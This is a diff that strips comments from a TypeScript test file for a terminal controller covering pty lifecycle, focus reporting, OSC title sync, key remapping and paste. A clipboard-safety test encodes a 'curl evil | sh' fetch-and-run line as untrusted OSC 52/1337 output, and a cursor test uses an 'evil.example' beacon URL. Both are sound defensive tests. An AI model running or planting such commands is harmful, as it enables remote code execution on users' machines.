@@ -18,9 +18,6 @@ const listeners: ListenerRecord[] = [];
     listen: () => {},
     off: () => {},
   },
-  // matchMedia stub: theme.ts calls window.matchMedia at module-init time.
-  // Without this, any test file that loads theme.ts after this file replaces
-  // globalThis.window would crash with "window.matchMedia is not a function".
   matchMedia: (_query: string) => ({
     matches: false,
     media: _query,
@@ -35,11 +32,6 @@ const listeners: ListenerRecord[] = [];
   }),
 };
 
-// document stub: the terminal controller's resolveCurrentThemeId() accesses
-// document.documentElement.getAttribute("data-theme") at init time. In bun's
-// test environment, `document` is undefined when window is replaced with a
-// plain stub. Providing a minimal document stub lets initialize() proceed so
-// this.term and this.ptyClient are set before tests call reopen().
 (globalThis as Record<string, unknown>).document = {
   documentElement: {
     getAttribute: (_name: string): string | null => null,
@@ -52,8 +44,6 @@ const listeners: ListenerRecord[] = [];
   activeElement: null,
 };
 
-// Mock response the foregroundProcess RPC returns — changed per test via
-// setForegroundProcessName.
 let mockForegroundProcessName = "lazygit";
 
 mock.module("../../../../../src/renderer/ipc/client", () => ({
@@ -73,16 +63,8 @@ mock.module("../../../../../src/renderer/ipc/client", () => ({
       if (index >= 0) listeners.splice(index, 1);
     };
   }),
-  // The exports below are unused by terminal-services tests but must be present
-  // in the mock so that any module with a static `import { … }` binding for
-  // ipc/client can link successfully when evaluated in the same Bun process.
-  // Bun's module cache freezes the export-list of the first mock registered for
-  // a given path; any subsequent mock.module call cannot add new named exports
-  // that were absent from the original registration.
   ipcStream: mock(() => ({ promise: new Promise(() => {}), onProgress: () => () => {} })),
   canUseIpcBridge: mock(() => false),
-  // unwrapIpcResult / mustSucceed — used by fs-mutations which is transitively
-  // loaded through operations/files.ts → open-terminal.ts.
   unwrapIpcResult: <T>(result: { ok: boolean; value?: T; message?: string; kind?: string }): T => {
     if (result.ok) return result.value as T;
     const err = new Error(result.message ?? "ipc error");
@@ -108,7 +90,6 @@ mock.module("../../../../../src/renderer/ipc/client", () => ({
     v !== null && typeof v === "object" && (v as Record<string, unknown>)["ok"] === false,
 }));
 
-// Spread over the real module so later files keep its other exports.
 const confirmRequests: string[] = [];
 let confirmReply = true;
 const realConfirmDialog = await import("../../../../../src/renderer/components/ui/confirm-dialog");
@@ -194,45 +175,26 @@ function makeTerminalControllerDeps(
     Promise.resolve({ pid: 4321 }),
 ) {
   const writes: string[] = [];
-  // Callbacks of writes xterm has not "parsed" yet; parseWrites() runs them.
   const unparsedWriteCallbacks: Array<() => void> = [];
   const spawnCalls: TerminalDimensions[] = [];
   const ptyWrites: string[] = [];
-  // What was pasted through xterm (term.paste).
   const pastes: string[] = [];
   let focusCalls = 0;
   let capturedDataHandler: ((data: string) => void) | null = null;
   let ptyOptions: PtyClientOptions | null = null;
-  // Mutable buffer state — tests switch it with setBufferType("alternate" | "normal") to
-  // verify the alternate screen guard. The default is "alternate" so the existing OSC
-  // title sync tests pass without extra setup (assuming a TUI scenario).
   const bufferState: { active: { type: "normal" | "alternate" } & Record<string, unknown> } = {
     active: { type: "alternate" },
   };
-  // The handlers of DECSTR (CSI ! p) and RIS (ESC c), which show the cursor again.
   let capturedSoftReset: (() => boolean) | null = null;
   let capturedReset: (() => boolean) | null = null;
-  // DECSET 2004 and 1004 state the app on the pty asked for; tests flip it.
   const modes = { bracketedPasteMode: false, sendFocusMode: false };
-  // The text selected in the terminal; tests set it.
   let selection = "";
-  // controller.ts:317 calls attachCustomKeyEventHandler to register a handler that
-  // intercepts keydown. The handler is captured so tests can call it with synthetic
-  // KeyboardEvents and verify the branches.
   let capturedKeyHandler: ((event: KeyboardEvent) => boolean) | null = null;
-  // The onTitleChange callback is captured the same way — for verifying OSC 0/1/2 scenarios.
   let capturedTitleHandler: ((title: string) => void) | null = null;
-  // alt screen exit CSI handler. If params contains one of 47/1047/1049 it is interpreted as an
-  // alt→normal transition and a processTitle clear fires. In the xterm.js v5 API, params is
-  // a plain (number | number[])[] array.
   let capturedAltExitHandler: ((params: ReadonlyArray<number | number[]>) => boolean) | null = null;
-  // alt screen ENTER CSI handler — on TUI start, fetches the fg process name over IPC and
-  // sets processTitle.
   let capturedAltEnterHandler: ((params: ReadonlyArray<number | number[]>) => boolean) | null =
     null;
-  // The OSC handlers the controller registers, by number.
   const oscHandlers = new Map<number, (data: string) => boolean>();
-  // xterm's input: the document's activeElement is it while the user types in the terminal.
   const textarea = {} as HTMLTextAreaElement;
   const deps: TerminalControllerDeps = {
     waitForTerminalFonts: () => Promise.resolve(),
@@ -249,8 +211,6 @@ function makeTerminalControllerDeps(
           id: { prefix?: string; intermediates?: string; final: string },
           cb: (params: ReadonlyArray<number | number[]>) => boolean,
         ) => {
-          // The controller registers handlers for prefix:"?", final:"l" (exit) /
-          // final:"h" (enter); xterm.js runs every handler for a sequence, and so does this.
           if (id.prefix === "?" && id.final === "l") {
             const previous = capturedAltExitHandler;
             capturedAltExitHandler = (params) => {
@@ -260,7 +220,6 @@ function makeTerminalControllerDeps(
           } else if (id.intermediates === "!" && id.final === "p") {
             capturedSoftReset = () => cb([]);
           } else if (id.prefix === "?" && id.final === "h") {
-            // xterm.js runs every handler for a sequence; so does this one.
             const previous = capturedAltEnterHandler;
             capturedAltEnterHandler = (params) => {
               const handled = previous?.(params) ?? false;
@@ -340,7 +299,6 @@ function makeTerminalControllerDeps(
     pastes,
     getPtyOptions: () => ptyOptions,
     getFocusCalls: () => focusCalls,
-    /** Emits `data` the way xterm does for typed keys and its own answers. */
     termData(data: string): void {
       capturedDataHandler?.(data);
     },
@@ -348,7 +306,6 @@ function makeTerminalControllerDeps(
       for (const callback of unparsedWriteCallbacks.splice(0)) callback();
     },
     getKeyHandler: () => capturedKeyHandler,
-    /** Runs the controller's handler of OSC `id` on `data`, as xterm does for output. */
     osc(id: number, data: string): void {
       oscHandlers.get(id)?.(data);
     },
@@ -359,7 +316,6 @@ function makeTerminalControllerDeps(
     setBufferType(type: "normal" | "alternate"): void {
       bufferState.active.type = type;
     },
-    /** Puts plain rows on the screen, and the cursor at `cursor` of it. */
     setScreen(rows: string[], cursor: { x: number; y: number }): void {
       const cols = 20;
       const zero = () => 0;
@@ -660,14 +616,6 @@ describe("services/terminal pty-client flow control", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// PTY exit lifecycle — verifies the renderer-side cleanup that happens AFTER
-// the main process emits 'pty:exit'. The previous tests only assert that the
-// renderer sent 'pty:kill'; this section closes the loop by simulating the
-// exit echo and asserting that onExit fires, listeners stop firing, and a
-// subsequent spawn for the same tabId is not deduped against the dead session.
-// ---------------------------------------------------------------------------
-
 describe("services/terminal pty-client exit lifecycle", () => {
   beforeEach(resetIpc);
 
@@ -692,8 +640,6 @@ describe("services/terminal pty-client exit lifecycle", () => {
     emit("pty", "exit", { workspaceId: WS, tabId: "tab-exit", code: 0 });
     expect(exits).toEqual([{ code: 0 }]);
 
-    // Late-arriving data after exit should still flow through onData (the listener
-    // is removed by dispose, not by exit) — but a subsequent dispose must not double-fire onExit.
     emit("pty", "data", { workspaceId: WS, tabId: "tab-exit", chunk: "ghost" });
     expect(received).toBe("aliveghost");
 
@@ -714,10 +660,8 @@ describe("services/terminal pty-client exit lifecycle", () => {
     const first = await client.spawn({ cols: 80, rows: 24 });
     expect(first).toEqual({ pid: 1234 });
 
-    // Exit echo from main process — should clear the live-session marker.
     emit("pty", "exit", { workspaceId: WS, tabId: "tab-respawn", code: 0 });
 
-    // Next spawn must hit the IPC again (not be deduped as already-live).
     const beforeCount = ipcCalls.filter((c) => c.channel === "pty" && c.method === "spawn").length;
     const second = await client.spawn({ cols: 80, rows: 24 });
     const afterCount = ipcCalls.filter((c) => c.channel === "pty" && c.method === "spawn").length;
@@ -811,8 +755,6 @@ describe("app-wide terminal exit listener", () => {
     };
     const client = createPtyClient(options);
     await client.spawn({ cols: 80, rows: 24 });
-    // The view unmounts, as behind the SSH "session expired" placeholder,
-    // before main reports the exit.
     client.dispose();
 
     emit("pty", "exit", { workspaceId: WS, tabId: terminal.tabId, code: null });
@@ -839,7 +781,6 @@ describe("services/terminal controller focus", () => {
   });
   afterEach(() => jest.useRealTimers());
 
-  /** Past the moment a program that asked for focus reports is told about focus. */
   const afterFocusReportDelay = () => jest.advanceTimersByTime(300);
 
   it("tells a program turning on focus reporting that an unfocused terminal is not focused", async () => {
@@ -862,9 +803,7 @@ describe("services/terminal controller focus", () => {
     expect(harness.ptyWrites).toEqual([]);
 
     expect(decset([1004])).toBe(false);
-    // xterm.js turns the mode on after the handler.
     harness.setFocusReporting(true);
-    // Not at once: Codex drops what comes while it sets up.
     expect(harness.ptyWrites).toEqual([]);
     await afterFocusReportDelay();
     expect(harness.ptyWrites).toEqual(["\x1b[O"]);
@@ -892,15 +831,12 @@ describe("services/terminal controller focus", () => {
     const decset = harness.getAltEnterHandler();
     const decrst = harness.getAltExitHandler();
     if (!decset || !decrst) throw new Error("no DECSET handlers");
-    // Hidden (DECTCEM reset), as a program drawing its own hides it; xterm goes on as it would.
     expect(decrst([25])).toBe(false);
     expect(controller.readScreen(50)).toEqual({ text: "$ git sta" });
-    // Other modes leave it as it is.
     decset([2004]);
     expect(controller.readScreen(50).caret).toBeUndefined();
     decset([25]);
     expect(controller.readScreen(50).caret).toEqual({ line: 0, column: 7 });
-    // A reset shows it again.
     decrst([25]);
     expect(harness.softReset()).toBe(false);
     expect(controller.readScreen(50).caret).toBeDefined();
@@ -926,8 +862,6 @@ describe("services/terminal controller focus", () => {
     const decset = harness.getAltEnterHandler();
     if (!decset) throw new Error("no DECSET handler");
 
-    // ConPTY turned focus reporting on when the shell started; the program's
-    // own request never reaches the terminal.
     harness.setFocusReporting(true);
     expect(decset([2026])).toBe(false);
     await afterFocusReportDelay();
@@ -945,7 +879,6 @@ describe("services/terminal controller focus", () => {
 describe("services/terminal controller focus asked for before xterm opens", () => {
   beforeEach(() => resetIpc());
 
-  /** A controller whose fonts load when `loaded` is called. */
   function lateTerminal(tabId: string) {
     const harness = makeTerminalControllerDeps();
     let loaded = () => {};
@@ -966,7 +899,6 @@ describe("services/terminal controller focus asked for before xterm opens", () =
     return { harness, controller, loaded: () => loaded() };
   }
 
-  /** Past xterm opening, once the fonts have loaded. */
   const opened = () => new Promise((resolve) => setTimeout(resolve, 0));
 
   it("focuses it once it opens", async () => {
@@ -982,7 +914,6 @@ describe("services/terminal controller focus asked for before xterm opens", () =
     const { harness, controller, loaded } = lateTerminal("tab-focus-late-typing");
     let still = true;
     controller.focus(() => still);
-    // A tab's name being edited while the fonts load.
     still = false;
     loaded();
     await opened();
@@ -1066,11 +997,6 @@ describe("services/terminal controller ready for input", () => {
   beforeEach(resetIpc);
   afterEach(() => jest.useRealTimers());
 
-  /**
-   * A controller whose fonts load when `loaded` is called, and whose session
-   * starts as `spawned` says (null: it was already running); with none, an
-   * ended terminal that is not started again.
-   */
   function terminal(tabId: string, spawned?: { pid: number } | null) {
     const harness = makeTerminalControllerDeps(() => Promise.resolve(spawned ?? null));
     let loaded = () => {};
@@ -1126,7 +1052,6 @@ describe("services/terminal controller ready for input", () => {
     });
     loaded();
     await flushTerminalInit();
-    // Open, but the shell has not printed: PowerShell would drop the input.
     jest.advanceTimersByTime(20);
     await Promise.resolve();
     expect(ready).toBeUndefined();
@@ -1262,12 +1187,10 @@ describe("services/terminal controller replay", () => {
     const options = harness.getPtyOptions();
     if (!options) throw new Error("pty client not created");
 
-    // A replayed cursor-position query: xterm answers it while parsing.
     options.onData("\x1b[6n", true);
     harness.termData("\x1b[12;1R");
     expect(harness.ptyWrites).toEqual([]);
 
-    // Once the replay is parsed, answers and keys reach the program again.
     harness.parseWrites();
     options.onData("\x1b[6n", false);
     harness.termData("\x1b[3;1R");
@@ -1323,8 +1246,6 @@ describe("services/terminal controller reopen", () => {
   });
 
   it("treats spawn=null (already live) as a no-op so the view does not show failed copy", async () => {
-    // spawn returning null signals the session is already live; the controller
-    // must not throw so the caller never sets reopenState to "failed".
     const harness = makeTerminalControllerDeps(() => Promise.resolve(null));
     const controller = createTerminalController(
       {
@@ -1338,28 +1259,13 @@ describe("services/terminal controller reopen", () => {
     );
     await flushTerminalInit();
 
-    // Must resolve without throwing — no failed state propagated to the view.
     await expect(controller.reopen()).resolves.toBeUndefined();
-    // No separator written when the session was already live.
     expect(harness.writes).toEqual([]);
 
     controller.dispose();
   });
 });
 
-// ---------------------------------------------------------------------------
-// Custom key handler — line-begin/line-end → substituted with Ctrl+A/Ctrl+E.
-//
-// Background: the Claude Code TUI (Ink) does not recognize `\x1b[H`/`\x1b[F` as line-begin/end,
-//   and in our environment xterm.js does not send Home/End to the PTY either, so the
-//   combined issue left the line shortcuts unresponsive. Measuring cmux confirmed that it
-//   substitutes and sends `^A`/`^E`.
-//   These are readline standard, so they work with Claude Code / bash / zsh alike.
-//
-// Both macOS conventions are mapped:
-//   - external full-size keyboard: bare Home / End
-//   - built-in keyboard (no Home/End keys): Cmd+← / Cmd+→
-// ---------------------------------------------------------------------------
 describe("services/terminal controller — 라인 단축키 치환", () => {
   beforeEach(() => {
     resetStores();
@@ -1384,8 +1290,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
     return { harness, controller, handler };
   }
 
-  // This file overwrites globalThis.window with a plain stub, so happy-dom's KeyboardEvent
-  // is unusable. A fake with only the fields the handler reads is enough.
   interface FakeKeyEvent {
     type: string;
     key: string;
@@ -1469,11 +1373,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
   });
 
   it("조합 중 bare Cmd(Meta) keydown → return false (xterm 조기 finalize 차단, preventDefault 안 함)", async () => {
-    // Regression guard for the Mac Cmd+←/→ duplicate-syllable bug: while an IME
-    // composition is active, the bare Meta keydown must be swallowed so xterm's
-    // CompositionHelper does not prematurely finalize (and later double-send)
-    // the composing syllable. It must NOT preventDefault (that would move the
-    // textarea caret and desync the composition offsets → "stuck" bug).
     const { harness, controller, handler } = await setupHandler();
     const event = fakeKeyEvent({ key: "Meta", metaKey: true, isComposing: true, keyCode: 91 });
 
@@ -1488,9 +1387,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
   });
 
   it("조합 중 Cmd+ArrowRight(=isComposing 상태) → xterm에 위임(return true), 직접 write 안 함", async () => {
-    // The composition guard must delegate the composing nav keydown to xterm so
-    // the syllable commits exactly once via compositionend; our ^E is issued on
-    // the separate non-composing keydown that follows.
     const { harness, controller, handler } = await setupHandler();
     const event = fakeKeyEvent({
       key: "ArrowRight",
@@ -1516,8 +1412,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
     expect(result).toBe(false);
     expect(event.defaultPrevented).toBe(true);
-    // The ^A/^E byte is written on a deferred macrotask (setTimeout 0) so it
-    // lands after any pending IME composition commit — flush before asserting.
     await new Promise((r) => setTimeout(r, 0));
     expect(harness.ptyWrites).toEqual(["\x01"]);
 
@@ -1532,7 +1426,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
     expect(result).toBe(false);
     expect(event.defaultPrevented).toBe(true);
-    // Deferred macrotask write — flush before asserting (see \x01 case).
     await new Promise((r) => setTimeout(r, 0));
     expect(harness.ptyWrites).toEqual(["\x05"]);
 
@@ -1547,8 +1440,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
     expect(result).toBe(false);
     expect(event.defaultPrevented).toBe(true);
-    // The ^A/^E byte is written on a deferred macrotask (setTimeout 0) so it
-    // lands after any pending IME composition commit — flush before asserting.
     await new Promise((r) => setTimeout(r, 0));
     expect(harness.ptyWrites).toEqual(["\x01"]);
 
@@ -1563,7 +1454,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
     expect(result).toBe(false);
     expect(event.defaultPrevented).toBe(true);
-    // Deferred macrotask write — flush before asserting (see \x01 case).
     await new Promise((r) => setTimeout(r, 0));
     expect(harness.ptyWrites).toEqual(["\x05"]);
 
@@ -1573,24 +1463,18 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
   it("modifier 동반 Home/End / 추가 modifier 동반 Cmd+arrow는 통과", async () => {
     const { harness, controller, handler } = await setupHandler();
 
-    // Shift+Home: extends the selection — passes through
     expect(handler(fakeKeyEvent({ key: "Home", shiftKey: true }) as unknown as KeyboardEvent)).toBe(
       true,
     );
-    // Cmd+End (Home/End key combined with a modifier): passes through — undefined sequence,
-    // so preserved
     expect(handler(fakeKeyEvent({ key: "End", metaKey: true }) as unknown as KeyboardEvent)).toBe(
       true,
     );
-    // Ctrl+Home: buffer-top intent: passes through
     expect(handler(fakeKeyEvent({ key: "Home", ctrlKey: true }) as unknown as KeyboardEvent)).toBe(
       true,
     );
-    // Alt+End: word-level intent: passes through
     expect(handler(fakeKeyEvent({ key: "End", altKey: true }) as unknown as KeyboardEvent)).toBe(
       true,
     );
-    // Shift+Cmd+ArrowLeft: macOS selection-extend intent: passes through
     expect(
       handler(
         fakeKeyEvent({
@@ -1600,11 +1484,9 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
         }) as unknown as KeyboardEvent,
       ),
     ).toBe(true);
-    // Option+ArrowRight: word-jump intent: passes through (alt alone, without meta)
     expect(
       handler(fakeKeyEvent({ key: "ArrowRight", altKey: true }) as unknown as KeyboardEvent),
     ).toBe(true);
-    // Bare ArrowLeft/ArrowRight (no modifier): cursor movement — passes through
     expect(handler(fakeKeyEvent({ key: "ArrowLeft" }) as unknown as KeyboardEvent)).toBe(true);
     expect(handler(fakeKeyEvent({ key: "ArrowRight" }) as unknown as KeyboardEvent)).toBe(true);
 
@@ -1624,7 +1506,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
     controller.dispose();
   });
 
-  // PowerShell selects the whole line on Ctrl+A, and cmd types ^A.
   it("leaves Home and End to PowerShell and cmd", async () => {
     for (const shellPath of [
       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
@@ -1669,10 +1550,8 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
     it("goes on the clipboard only while the user types in that terminal", async () => {
       const { harness, controller } = await setupHandler();
       const before = copied().length;
-      // Output in a terminal the user is not in: a file shown, a page fetched.
       harness.osc(52, `c;${b64("curl evil | sh")}`);
       harness.osc(1337, `Copy=:${b64("curl evil | sh")}`);
-      // The copy goes through a lazily imported IPC client.
       await new Promise((r) => setTimeout(r, 0));
       expect(copied().length).toBe(before);
       const { hasFocus, activeElement } = doc;
@@ -1681,7 +1560,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
         doc.activeElement = harness.textarea;
         harness.osc(52, `c;${b64("저장 ✓")}`);
         harness.osc(1337, `Copy=:${b64("npm test")}`);
-        // A read is never answered.
         harness.osc(52, "c;?");
       } finally {
         doc.hasFocus = hasFocus;
@@ -1710,7 +1588,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
       await new Promise((r) => setTimeout(r, 0));
       expect(copied()).toEqual([{ text: "hello" }]);
 
-      // Nothing selected now: xterm sends ^C.
       expect(
         handler(fakeKeyEvent({ key: "c", ctrlKey: true, keyCode: 67 }) as unknown as KeyboardEvent),
       ).toBe(true);
@@ -1748,14 +1625,12 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
       const event = ctrlV();
 
       expect(handler(event as unknown as KeyboardEvent)).toBe(false);
-      // No preventDefault: the native paste is what delivers the text.
       expect(event.defaultPrevented).toBe(false);
       expect(harness.ptyWrites).toEqual([]);
 
       controller.dispose();
     });
 
-    // A terminal whose container takes paste listeners, as the DOM does.
     const shellTerminal = async (shellPath: string | undefined, tabId: string) => {
       const listeners: ((event: unknown) => void)[] = [];
       const container = {
@@ -1773,7 +1648,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
       await new Promise((r) => setTimeout(r, 0));
       const handler = harness.getKeyHandler();
       if (!handler) throw new Error("customKey handler was not registered");
-      // The native paste Chromium runs: its event, with the clipboard's text.
       const paste = (text: string) => {
         const event = {
           defaultPrevented: false,
@@ -1792,7 +1666,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
     it("pastes into a program without bracketed paste, in any other shell", async () => {
       host.host = { platform: "win32" };
-      // cmd.exe has no ^V paste; Git Bash runs ssh to a line prompt; a remote shell has no path.
       const shells = ["C:\\Windows\\system32\\CMD.EXE", "C:\\Program Files\\Git\\bin\\bash.exe"];
       for (const [i, shellPath] of [...shells, undefined].entries()) {
         const { harness, controller, handler, paste } = await shellTerminal(shellPath, `tab-${i}`);
@@ -1800,7 +1673,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
 
         expect(handler(event as unknown as KeyboardEvent)).toBe(false);
         expect(event.defaultPrevented).toBe(false);
-        // xterm's own paste listener takes the paste.
         expect(paste("code#state").defaultPrevented).toBe(false);
         expect(harness.ptyWrites).toEqual([]);
 
@@ -1842,12 +1714,10 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
       host.host = { platform: "win32" };
       const { harness, controller, handler, paste } = await shellTerminal(POWERSHELL, "tab-later");
 
-      // A Ctrl+V that pasted nothing, then a paste from elsewhere (Ctrl+Shift+V).
       handler(ctrlV() as unknown as KeyboardEvent);
       await new Promise((r) => setTimeout(r, 0));
       expect(paste("later").defaultPrevented).toBe(false);
 
-      // A program that asked for bracketed paste gets it from xterm.
       harness.setBracketedPaste(true);
       handler(ctrlV() as unknown as KeyboardEvent);
       expect(paste("bracketed").defaultPrevented).toBe(false);
@@ -1883,8 +1753,6 @@ describe("services/terminal controller — 라인 단축키 치환", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// escapeDroppedPath — a dropped file's path, quoted for the terminal's shell
 describe("escapeDroppedPath", () => {
   it("backslash-escapes for a POSIX or remote shell, leaving Unicode letters", () => {
     expect(escapeDroppedPath("/Users/me/my file (1).png")).toBe(
@@ -1894,8 +1762,6 @@ describe("escapeDroppedPath", () => {
     expect(escapeDroppedPath("/tmp/plain.txt", "/bin/bash")).toBe("/tmp/plain.txt");
   });
 
-  // Regression: on Windows the POSIX escapes broke the path in PowerShell
-  // and cmd, which do not take a backslash as an escape.
   it("single-quotes for PowerShell, doubling quotes in the name", () => {
     const pwsh = "C:\\Program Files\\PowerShell\\7\\pwsh.exe";
     expect(escapeDroppedPath("C:\\Users\\me\\my file.png", pwsh)).toBe(
@@ -1912,8 +1778,6 @@ describe("escapeDroppedPath", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// oscCursorStyle — OSC 22 cursor shape from untrusted terminal output
 describe("oscCursorStyle", () => {
   it("passes CSS cursor keywords through", () => {
     expect(oscCursorStyle("pointer")).toBe("pointer");
@@ -1921,8 +1785,6 @@ describe("oscCursorStyle", () => {
     expect(oscCursorStyle("")).toBe("");
   });
 
-  // Regression: the body was assigned to style.cursor verbatim, so
-  // `url(https://…)` made the renderer fetch an attacker-chosen URL.
   it("resets anything that is not a plain keyword", () => {
     expect(oscCursorStyle("url(https://evil.example/beacon), auto")).toBe("");
     expect(oscCursorStyle("image-set(url(x.png) 1x), pointer")).toBe("");
@@ -1930,8 +1792,6 @@ describe("oscCursorStyle", () => {
   });
 });
 
-// isShellPromptLikeTitle — shell prompt OSC filter heuristic
-// ---------------------------------------------------------------------------
 describe("isShellPromptLikeTitle", () => {
   it("path / cwd 포함 → prompt-like로 판정", () => {
     expect(isShellPromptLikeTitle("kih@MacBookPro:~/workspaces/project")).toBe(true);
@@ -1967,9 +1827,6 @@ describe("isShellPromptLikeTitle", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// isLoginShell — decides whether the foreground comm is a login shell (filters command echo noise)
-// ---------------------------------------------------------------------------
 describe("isLoginShell", () => {
   it("알려진 셸 이름 → true", () => {
     for (const sh of ["sh", "bash", "zsh", "fish", "dash", "ksh", "tcsh", "csh"]) {
@@ -1996,9 +1853,6 @@ describe("isLoginShell", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// classifyOscTitle — first-pass classification by (title, buffer type)
-// ---------------------------------------------------------------------------
 describe("classifyOscTitle", () => {
   it("alternate + 비셸틱 → apply (lazygit/yazi/vim)", () => {
     expect(classifyOscTitle("lazygit", "alternate")).toBe("apply");
@@ -2021,9 +1875,6 @@ describe("classifyOscTitle", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// foregroundConfirmsTitle — on the confirm path, decides from the foreground name whether to apply
-// ---------------------------------------------------------------------------
 describe("foregroundConfirmsTitle", () => {
   it("실제 프로그램이 foreground → 적용", () => {
     expect(foregroundConfirmsTitle("node")).toBe(true);
@@ -2043,10 +1894,6 @@ describe("foregroundConfirmsTitle", () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// OSC 0/1/2 title sync — when claude / lazygit / lazydocker send their own name/state,
-// the tab's processTitle must be updated.
-// ---------------------------------------------------------------------------
 describe("services/terminal controller — OSC title sync", () => {
   beforeEach(() => {
     resetStores();
@@ -2085,9 +1932,6 @@ describe("services/terminal controller — OSC title sync", () => {
   });
 
   it("normal screen 명령 에코는 foreground가 셸이면 무시 — starship preexec 가드", async () => {
-    // The case where the zsh preexec hook fires the current command such as "ls -G" as OSC 2.
-    // At that point the foreground is still the shell (before the command's exec), so the
-    // foregroundProcess check rejects it.
     mockForegroundProcessName = "zsh";
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
     const harness = makeTerminalControllerDeps();
@@ -2107,7 +1951,6 @@ describe("services/terminal controller — OSC title sync", () => {
     if (!titleHandler) throw new Error("title handler missing");
 
     titleHandler("ls -G");
-    // Wait for the async foregroundProcess response on the confirm path
     await Promise.resolve();
     await Promise.resolve();
 
@@ -2116,11 +1959,9 @@ describe("services/terminal controller — OSC title sync", () => {
     expect(updated.title).toBe("Terminal");
 
     controller.dispose();
-    mockForegroundProcessName = "lazygit"; // restore default
+    mockForegroundProcessName = "lazygit";
   });
 
-  // A command that ends at once: its prompt's title clears the tab while the
-  // check of its echo is still out.
   it("drops a deferred title that a later title overtook", async () => {
     mockForegroundProcessName = "ls";
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
@@ -2148,12 +1989,10 @@ describe("services/terminal controller — OSC title sync", () => {
     expect(useTabsStore.getState().byWorkspace[WS][tab.id].processTitle).toBeUndefined();
 
     controller.dispose();
-    mockForegroundProcessName = "lazygit"; // restore default
+    mockForegroundProcessName = "lazygit";
   });
 
   it("normal screen inline TUI(claude)는 foreground가 실제 프로그램이면 적용", async () => {
-    // Claude Code does not enter the alternate screen; it fires its title via OSC 2 on the
-    // normal screen. It must be applied if the foreground is a real program, not a shell.
     mockForegroundProcessName = "node";
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
     const harness = makeTerminalControllerDeps();
@@ -2179,12 +2018,11 @@ describe("services/terminal controller — OSC title sync", () => {
     expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("✳ Claude Code");
 
     controller.dispose();
-    mockForegroundProcessName = "lazygit"; // restore default
+    mockForegroundProcessName = "lazygit";
   });
 
   it("normal screen 셸 프롬프트는 processTitle을 clear — inline TUI 종료 시 복귀", async () => {
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
-    // Simulates the processTitle that claude applied just before
     useTabsStore.getState().setProcessTitle(WS, tab.id, "✳ Claude Code");
     const harness = makeTerminalControllerDeps();
     harness.setBufferType("normal");
@@ -2202,7 +2040,6 @@ describe("services/terminal controller — OSC title sync", () => {
     const titleHandler = harness.getTitleHandler();
     if (!titleHandler) throw new Error("title handler missing");
 
-    // claude exits → the shell prompt fires user@host:cwd as OSC 2 (shellLike) → clear
     titleHandler("kih@monolith:~/workspaces/img_intern");
 
     const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
@@ -2215,7 +2052,7 @@ describe("services/terminal controller — OSC title sync", () => {
   it("alternate ↔ normal 전이를 거치는 시나리오 — TUI title만 적용 + 종료 시 자동 복귀", async () => {
     const tab = useTabsStore.getState().createTab(WS, { type: "terminal", props: { cwd: "/" } });
     const harness = makeTerminalControllerDeps();
-    harness.setBufferType("normal"); // the initial shell is on the normal screen
+    harness.setBufferType("normal");
     const controller = createTerminalController(
       {
         workspaceId: WS,
@@ -2232,23 +2069,20 @@ describe("services/terminal controller — OSC title sync", () => {
     if (!titleHandler) throw new Error("title handler missing");
     if (!altExitHandler) throw new Error("alt-exit handler missing");
 
-    // shell preexec — the foreground is the shell, so it must be ignored
     mockForegroundProcessName = "zsh";
     titleHandler("ls -G");
     await Promise.resolve();
     await Promise.resolve();
     expect(useTabsStore.getState().byWorkspace[WS][tab.id].processTitle).toBeUndefined();
 
-    // The user runs lazygit → enters alternate → fires "lazygit" (alternate needs no RPC)
-    mockForegroundProcessName = "lazygit"; // restore default
+    mockForegroundProcessName = "lazygit";
     harness.setBufferType("alternate");
     titleHandler("lazygit");
     expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("lazygit");
 
-    // lazygit exits → alt screen exit CSI fires (`\x1b[?1049l`) → processTitle clear → back to defaultTitle
     harness.setBufferType("normal");
     const ret = altExitHandler([1049]);
-    expect(ret).toBe(false); // delegated to xterm.js's default buffer swap
+    expect(ret).toBe(false);
     const updated = useTabsStore.getState().byWorkspace[WS][tab.id];
     expect(updated.processTitle).toBeUndefined();
     expect(updated.title).toBe("Terminal");
@@ -2306,7 +2140,6 @@ describe("services/terminal controller — OSC title sync", () => {
     if (!titleHandler || !altExit) throw new Error("handlers missing");
 
     titleHandler("claude");
-    // 25 = DECTCEM (cursor hide), not a target of our alt guard
     altExit([25]);
     expect(useTabsStore.getState().byWorkspace[WS][tab.id].title).toBe("claude");
 
@@ -2331,11 +2164,9 @@ describe("services/terminal controller — OSC title sync", () => {
     const altEnter = harness.getAltEnterHandler();
     if (!altEnter) throw new Error("alt-enter handler missing");
 
-    // alt-screen ENTER — returns false immediately after a fire-and-forget RPC call
